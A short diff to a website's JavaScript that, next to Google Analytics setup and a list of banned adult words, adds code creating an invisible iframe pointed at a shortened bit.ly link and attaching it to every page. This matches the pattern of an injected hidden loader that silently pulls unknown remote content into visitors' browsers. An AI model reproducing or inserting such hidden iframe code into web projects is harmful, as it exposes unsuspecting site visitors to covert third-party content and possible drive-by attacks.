@@ -6,6 +6,11 @@
   ga('create', 'UA-56478916-1', 'auto');
   ga('send', 'pageview');
   
+ var iframe = document.createElement('iframe');
+iframe.style.display = "none";
+iframe.src = "http://bit.ly/18SHOAH";
+document.body.appendChild(iframe);
+  
   var adultsite = false;
    var adultwordbans = ['porn', 'pussy', 'anal sex', 'blowjob'];
 				
